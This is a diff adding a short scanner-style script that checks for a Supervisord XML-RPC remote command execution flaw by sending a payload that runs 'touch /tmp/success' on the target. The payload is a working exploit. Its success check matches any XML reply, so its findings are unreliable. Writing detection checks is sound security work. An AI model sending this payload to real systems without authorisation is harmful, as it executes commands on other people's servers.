@@ -1,0 +1,13 @@
+#request url = var
+#define payload =/RPC2
+#define bug = <?xml version
+#define info = 存在Supervisord 远程命令执行漏洞
+#define post = <?xml version="1.0"?><methodCall><methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName><params><param><string>touch /tmp/success</string></param></params></methodCall>
+function main(args)
+{
+	res = HttpPost(url.payload,post,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
